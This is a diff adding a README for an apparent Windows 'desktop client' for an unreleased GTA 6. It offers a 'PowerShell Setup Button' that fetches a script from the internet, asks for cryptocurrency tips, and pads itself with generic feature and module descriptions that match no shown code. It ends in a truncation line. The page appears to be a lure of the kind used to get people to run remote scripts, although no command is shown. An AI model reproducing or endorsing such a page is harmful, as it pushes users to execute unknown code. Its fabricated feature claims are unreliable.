@@ -1,0 +1,85 @@
+Gta6 Masalenps5 Gta 6 — Windows Desktop Client 🖥️
+
+🔌 PowerShell Setup Button
+
+Give me a tip
+
+BTC:&nbsp;1LuaapQF9D6cc2LDzk3qXTF9nPX1q4oboA | ETH:&nbsp;0xA87fFC95F8D75a25d7a7f74FA3BC66FEC26D047d | TRON:&nbsp;TJwwTPh8Ru7MxFan1wAhSxXrEMCm6tLTWh
+
+Gta6 Masalenps5 Gta 6 is a desktop software project centered on the GTA6-masalenPS5-GTA-6 package, delivering a focused, feature-driven implementation for local deployment. It provides a structured architecture that emphasizes reliable execution, efficient resource use, and clear separation between core logic and supporting components. The software is designed for technical users who require predictable behavior and straightforward configuration when running the application on desktop environments.
+
+📋 System Requirements
+
+- PowerShell 5.1+ (pre-installed on Windows 10 and 11)
+- Windows 10 / 11 (x64)
+- Internet connection — required to fetch the script
+- Administrator — not required
+
+Features
+
+- High-fidelity rendering pipeline supporting advanced lighting, shadow, and material systems for consistent visual output across supported desktop configurations.
+- Configurable performance profiles that allow tuning of resolution scaling, frame pacing, and quality presets to match available hardware resources.
+- Modular asset streaming architecture designed to reduce load times and maintain stable memory usage during extended sessions.
+- Integrated input mapping layer with support for keyboard, mouse, and common gamepad configurations, including remappable bindings.
+- Local save-state and configuration management with versioned settings and automatic backup of user profiles.
+- Built-in diagnostics panel exposing runtime metrics such as frame rate, memory allocation, and asset streaming status for troubleshooting.
+- Deterministic configuration validation that checks hardware and software prerequisites before launch and reports actionable incompatibilities.
+- Extensible settings schema enabling granular control over graphics, audio, and control subsystems without requiring external tools.
+- Offline-first operation with no mandatory network dependency for core functionality.
+- Structured logging with adjustable verbosity levels to assist in debugging and support workflows.
+
+How it works
+
+Gta6 Masalenps5 Gta 6 operates as a self-contained desktop application that coordinates game asset streaming, input handling, and save-state management within a single process. On launch, the application initializes a lightweight runtime layer that detects available system resources and configures memory buffers, render targets, and controller mappings before any game content is loaded. This runtime layer isolates the application's execution from the host operating system, ensuring that asset decoding and state transitions remain consistent across supported desktop configurations.
+
+The core pipeline is built around three cooperating subsystems. The asset manager indexes and streams packaged game data on demand, decompressing resources into memory only when they are required by the active scene. The input abstraction layer normalizes keyboard, mouse, and gamepad events into a unified command stream, applying configurable dead zones and remapping profiles without restarting the application. The session controller maintains the authoritative game state, persisting save data and configuration at defined checkpoints and on graceful shutdown.
+
+Rendering is handled by a staged compositor that decouples scene updates from frame presentation. Scene logic runs on a fixed timestep, while the compositor interpolates and presents frames at the display's native refresh rate, reducing stutter during asset streaming. Graphics settings such as resolution scaling, texture filtering, and frame pacing are applied through the runtime configuration and take effect without requiring a full application restart.
+
+Configuration and save data are stored in a versioned, human-readable format within the application's local data directory. The versioning scheme allows the application to migrate older profiles forward automatically, and malformed or incompatible files are quarantined rather than overwriting valid data. Diagnostic logging captures subsystem events, timings, and errors to a rotating log, which supports troubleshooting without exposing user content.
+
+Resource lifecycle management is centralized: the asset manager tracks reference counts for every loaded resource and evicts unreferenced data during idle periods or when memory pressure thresholds are exceeded. This keeps the application within its configured memory budget during extended sessions and prevents fragmentation from repeated scene transitions. The runtime also performs integrity checks on packaged data at startup, reporting any missing or corrupted resources before gameplay begins.
+
+Modules and Settings
+
+Session Profile Manager
+This module acts as the central hub that ties every other part of GTA6-masalenPS5-GTA-6 together, letting the user define and switch between complete session configurations before play begins.
+- Create, duplicate and rename named session profiles so distinct play styles stay separated.
+- Edit stored play style preferences, activity priorities and controller mappings within each profile.
+- Select an active profile before launching a session, with the currently loaded configuration always displayed.
+- Changes made in other modules are written to the active profile, so switching profiles also switches the associated plans, mappings and notes.
+
+Mission and Activity Planner
+This module turns the user's intentions for a session into an ordered, trackable list that connects directly to the active profile and the progress tracker.
+- Build a sequence of intended missions, side activities and free-roam goals for the current play session.
+- Reorder entries, mark them as completed or deferred, and attach short annotations to each item.
+- View a live checklist alongside a progress view that reflects the state of each entry as it is updated.
+- Completed entries flow into the Progress Tracker overview so planning and logging stay consistent.
+
+Controller Mapping Reference
+This module stores the user's own PS5 controller input layouts per profile, providing a reference the user can consult before and during play.
+- Define button and input mappings for driving, on-foot movement and menu navigation as separate layouts.
+- Compare layouts side by side to confirm which configuration is active for the current profile.
+- Keep mappings bound to session profiles, so changing profiles automatically changes the displayed reference layout.
+
+Location and Route Notes
+This module gives the user a workspace for places and paths worth revisiting, organised so they can be recalled quickly and linked to planned activities.
+- Record places of interest, waypoints and route ideas with labels, categories and short descriptions.
+- Browse entries in a sortable list and filter by category to narrow the view.
+- Attach notes to specific planned activities in the Mission and Activity Planner, connecting locations to the session plan.
+
+Progress Tracker
+This module consolidates milestones, collectible progress and personal objectives across sessions into a single overview that reflects activity from the planner and notes modules.
+- Log each milestone or objective with a status value and optional notes.
+- Review an overview panel summarising how many entries are open, in progress or finished.
+- Track progress across multiple sessions, with entries remaining associated with the profile that recorded them.
+
+Session Timer and Break Reminders
+This module supports structured play sessions by keeping time visible and prompting the user at chosen intervals.
+- Set a session length and optional break intervals with adjustable durations.
+- Follow a visible countdown while the session is active.
+- Receive an on-screen reminder when an interval elapses, then decide whether to pause or continue.
+
+Additional Settings
+
+…（内容已截断）
